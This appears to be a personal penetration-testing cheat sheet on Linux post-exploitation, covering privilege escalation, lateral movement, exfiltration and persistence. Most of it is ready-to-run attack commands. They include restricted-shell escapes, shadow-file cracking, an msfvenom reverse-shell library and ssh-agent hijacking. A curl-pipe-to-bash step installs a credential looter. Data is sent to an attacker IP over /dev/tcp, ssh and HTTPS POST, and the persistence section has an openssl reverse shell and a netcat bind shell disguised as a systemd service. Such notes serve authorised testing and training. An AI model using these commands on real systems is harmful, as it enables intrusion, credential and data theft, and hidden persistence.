After we have access on a system we should go through these phases:
- information gathering -> [[Linux Exploitation/Information Gathering]] and [[Network Security/Information gathering]]
- privilege escalation
- lateral movement
- data exfiltration
- mainting access


## Privilege escalation

> Check System, Network and User Information

Get all information possible that may hint to vulnerabilities or used tasks and tools that allow for an escalation of privileges.

### Check for services

Can we read or modify service configuration files:

```bash
find /etc/init.d/ ! -uid 0 -type f 2>/dev/null | xargs ls -la
```

Check service config files:

```bash
cat /etc/mysql/my.cnf
```

Can we start/stop a service:

```bash
service <servicename> start # or stop - sudo required?
```

### Check for jobs and tasks

Check if and what jobs are running and when:

```bash
cat /etc/crontab
ls -als /etc/cron.*  
```

Jobs from root that are world writeable:

```bash
find /etc/cron* -type -f -perm -o+w -exec ls -l {} \;
```

### Check for installed software and the version

What is installed:

```bash
dpkg -l  # careful, large output
ls /opt  # may also hint to sw
```

### Check permissions

Check possible programs we are allowed to run with sudo

```bash
sudo -l
```

### Search for Passwords

In configuration- and logfiles:

```bash
grep -r password /etc/*.conf 2> /dev/null
cat /Var/log/apache/access.log | grep -E "^user|^pass" # check apache log
cat /etc/NetworkManager/system-connections/* |grep -E “^id|^psk” # PSK NW-manager
```

### Scripts to work with

- `linenum` / `linpeas` 
- metasploit `use post/linux/gather/enum_configs` and other modules

### Specific exploits

- `$origin` expansion privilege escalation (glibc <2.11.3 && 2.12.x - 2.12.1)
```bash
msf> use exploit/linux/local/glibc_origin_expansion_priv_esc
```

- [dockerdevil](https://github.com/pyperanger/dockerevil)

### Restricted shells

- restricted shells and ways to break out
	- `rbash` may be one
	- `chroot` jail

1. Determine you're in a restriced shell

```bash
cd  # try calling some binaries
> `rbash: cd: restricted`

echo $ENV
> SHELL=/bin/rbash # indicator
> PATH=/var/chroot/bin # indicator
```

2. Escape the shell 

```bash
# via VIM as possibility
vi /tmp/file
> :!sh # enter tp confirm -> the resulting shell should be outside your confinment

# via find
find /home/mike -name bla -exec /bin/sh \; # requires the bla file to exist in order to work and spawn a shell

# via python / perl
python -c 'import pty; pty.spawn("/bin/bash")'
perl -e 'exec "/bin7bash";' 

# via ssh form another system
ssh caged_user@target -t "/bin/bash" # try calling a shell via ssh before the restriction with rbash is applied
```

### Craking the shadow file

> for lateral movement or if we are missing credentials... 

- only attractive if hashing methods are old (md5 aka `$1` or `$5$` (SHA-256) which is harder -.-)
- dict attack against weak passwords

```bash
# convert to crackable john format:
unshadow passwd shadow > shadow.john
john shadow.john --wordlist/usr/share/wordlist/rockyou.txt # check the output
```

-> Or dump the passwords from memory: [mimipenguin](https://github.com/huntergregal/mimipenguin) (MimiKatz like tool for linux)
Try both the `.sh` and `.py` implementation to get most coverage!

### Dump sshd and sudo creds related strings

- [3snake](https://github.com/blendin/3snake)

### Reading from the swap file

1. Check location of the swap file 

```bash
swapon -s
cat /proc/swaps
```

2. Read data 

```bash
# requires permission on newer systems!
strings /swapfile | grep "password=" # or "&password="
```

- Search via [script](https://github.com/sevagas/swap_digger)

### Shared object library loading

> concerning `.so` files - similar behaviour as with `DLL Hijacking` in windows!

-> Exhaustive info [here](http://www.yolinux.com/TUTORIALS/LibraryArchives-StaticAndDynamic.html)

Types of shared objects
- `.a`: static libraries
- `.so`: dinamicly linked or loaded libs

Same as in windows - if shared objects are loaded, a certain order is adhered to:
1. Dirs specified by `-rpath-link`
2. Dirs specified by `-rpath`
3. If neither of above used search contents of: `LD_RUN_PATH` and `LD_LIBRARY_PATH`
4. Dirs defined in `DT_RUNPATH` or else in `DT_RPATH`
5. Following default lib dirs `/lib` and `/usr/lib`
6. Finally dirs defined in `/etc/ld.so.conf` file, moreover the files in `/etc/ld.so.conf.d/*`  

Before we can start consider the following
- what object files are loaded by the binary?
- can we write to them? 

```bash
ldd /path/2/binary # check output
```

- was the binary compiled with `RPATH` or `RUNPATH` ?  

```bash
objdump -x /path/2/binary | grep RPATH
objdump -x /path/2/binary | grep RUNPATH
# RPATH /tmp/prog/libs
```

#### Exploit

> Use `msfvenom` to generate a payload `.so` file  

```bash
msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=<yourIP> LPORT=<yourPort> -f elf-so -o sharedLib.so
```

For a privilege escalation to happen, the program must be run by a higher privileged user either manually, trough a trigger or via scheduled cronjob.

### Kernel exploits 

> Remember don't just compile and fire unknown payloads taken from the web!

```bash
# search in metasploit / exploitDB
searchsploit "linux kernel debian"
```

If exploit or shellcode is used -> check for requirements or compiling instructions in the readme or source directly!

Also compiling for other archs may be needed

```bash
gcc -m32 exploit.c -o exploit
```  

Sources for kernel exploits:
- [SecWiki-2020](https://github.com/SecWiki/linux-kernel-exploits)
- [ExploitDB](https://www.exploit-db.com/)
- [lucyoa](https://github.com/lucyoa/kernel-exploits)  

### Unix Sockets  

> Docker is (or at least *was* your friend) as docker binds to unix sockets (root permission) instead of tcp sockets (go for podman!)

If security is not implemented correctly:  

```bash
docker run -v /etc/shadow:/docker/hashedpasswords -d postgres # will output container id
docker exec -ti {container-id} bash # take container id above
## the steps above will spawn a docker container linking the shadow in the invironment

> cat /docker/hashedpasswords > /docker/out.txt
> chmod 777 /docker/out.txt
> cat /docker/out.txt
```

Other socket exploits:
- [openssh<7.4](https://www.exploit-db.com/exploits/40962)
- [juju-agent_system](https://github.com/rapid7/metasploit-framework/pull/9408/files)  

-> `Linenum.sh` and stuff to check what is exploitable

## Lateral movement on Linux  

> Moving horizontally to new machines in the network through already gained user:password combinations

### ssh hijacking sessions 

Cookbook:  

```bash
ps aux | grep sshd # check pid
grep SSH_AUTH_SOCK /proc/<pid>/environ # check environment var
SSH_AUTH_SOCK=/tmp/ssh-xxx/agent.xxxx ssh-add -l # hijack ssh-agent socket
ssh <remoteSystem> -l victim # login as our victim
```

### Steal ssh creds 

> Requires root permissions and a malicious PAM module that redirects the authentication requests to a server you control

- [sshLooter](https://github.com/mthbernardes/sshLooterC) (the better version)  

1. Download sshLooter and edit it so the your server IP is referred
2. Host the files to be downloaded
3. Have your server log post requests
4. Execut the following command on the victim machine  

```bash
curl http://yourIP:8000/install.sh | bash
```

5. Profit: the log should reveal a password!

### Samba secrets  

> Interesting if the samba server has a trust relationship with an AD infrastructure

```bash
sudo tdbdump /var/lib/samba/private/secrets.tdb # contains information about users
```

The file contains the `NTLM` hash of the computer account  

-> Use the [pthtoolkit](https://github.com/byt3bl33d3r/pth-toolkit) to pass-the-hash over the network.  

### VPN Pivot  

> Create VPN connection to the compromised host

- [source](https://github.com/0x36/VPNPivot)  

### dump FF creds  

> Get the logins file and decrypt it, works only if master password was NOT set

- [ff_decrypt](https://github.com/unode/firefox_decrypt)

Check for files: 

```bash
find /home -name logins.json -type f 2> /dev/null
```

Or Let the tool do all the work for you!

## Data Exfiltration  

> APT simulation and getting the data out of the environment
> Avoid cleartext transmission to bypass defense and not leak anything to others...

Example exfiltrations following:

### Exfil via TCP / EBCDIC / BASE64  

1. Prepare attacker for receiving data  

```bash
nc -nlvp 80 > data.tmp
```

2. Prepare data on victim side and transmit the double encoded, zipped data to the attacker machine

```bash
tar zcf - /tmp/<datafolder> | base64 | dd conv=ebcdic > /dev/tcp/<attackerIP>/80
```

3. Attacker side double decode and extract  

```bash
dd conv=ascii if=data.tmp | base64 -d > data.tar
tar xf data.tar
``` 

### Exfil via SSH  

1. Victim: tar the files and ssh over to the attacker machine  

```bash
tar zcf - /tmp/data | ssh root@<attackerIP> "cd /tmp; tar zxpf -"
``` 

2. This automatically untars the files on the attacker side and lets us check the /tmp/data folder  

### Exfil via POST over HTTPs  

1. **Attacker** provides http server that dumps POST data locally  

```bash
<?php file_put_contents('/tmp/data.base64', file_get_contents('php://input')); ?>  

# start local php via
php -S 0.0.0.0:8000
```

2. **Victim**: `curl` all data via POST to the attacker page  

```bash
curl --data "$(tar zcf - /tmp/data | base64)" https://<attackerIP>/contact.php
```
 
3. **Attacker** machine dumps the data  

```bash
cat /tmp/data.base64 | base64 -d > data.tar && tar xf data.tar
```

## Maintain Access & Persistence  

> Keep your foot in the door...  

### OpenSSL reverse shell  

> With named pipes `mkfifo` 

1. Create keys on our listener on the attacker machine  

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

2. Start the listener on the attacker  

```bash
openssl s_server -quiet -key key.pem -cert cert.pem -port 443
``` 

3. Make a named_pipe and link the I/O to openssl client  

```bash
mkfifo /tmp/x; /bin/sh -i < /tmp/x 2>&1 | openssl s_client -quiet -connect <attackerIP>:443 > /tmp/x; rm /tmp/x
```

4. Profit!  

### ICMP reverse shell

[SOURCE](https://github.com/bdamele/icmpsh)  

### Others  

- [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [highOn.coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/)  

### Xinetd port knocking backdoor

> Solution will persist acreoss reboots and initiates connection after knocking on a specific UDP port

1. Create xinetd service on target machine  

Use the [[xinetd.sh]] script file or look [here](https://gist.github.com/anonymous/3cb8e474b6bb3fd3787bda1e1a55cf56)  

2. Replace the IPs in the file and execute it  

This will create a new service (`services-udp`) on the victim machine listening on port `65534 udp` 

- `nc` required on victim

3. Attacker start listener listening on port `4444` (altered in script)  

4. Knock on the udp port and trigger backconnect to your listener shell  

```bash
hping -2 -c 1 <targetIP> -p 65534
```

### Bind shell with systemd  

1. On the victim copy nc and masquerade the binary  

```bash
cp /bin/nc /lib/systemd/systemd-service
```  

2. Victim: create a Service file  

```bash
[Unit]
Description = Systemd Service
After = network.target
[Service]
ExecStart = /lib/systemd/systemd-service -lvp 56825 -e /bin/sh
[Install]
WantedBy = multi-user.target
```

This service will start after the networking service is up and execute `nc` listening on port `56825` for incoming connections  

3. Victim IMPORTANT: enable the service for autostart  

```bash
systemctl enable systemd.service
systemctl start systemd.service
``` 

4. Victim: Check if the service is up and port listening  

```bash
netstat -auntp | grep 56825
``` 

5. Attacker: Connect to the bind shell!  

### Meterpreter specifics  

- staged payloads  

```bash
windows/meterpreter/reverse_tcp
```

- stageless payloads (larger, paylod within binary!)  

```bash
windows/meterpreter_reverse_tcp
```

Difference explained: [buffered.io](https://buffered.io/posts/staged-vs-stageless-handlers/)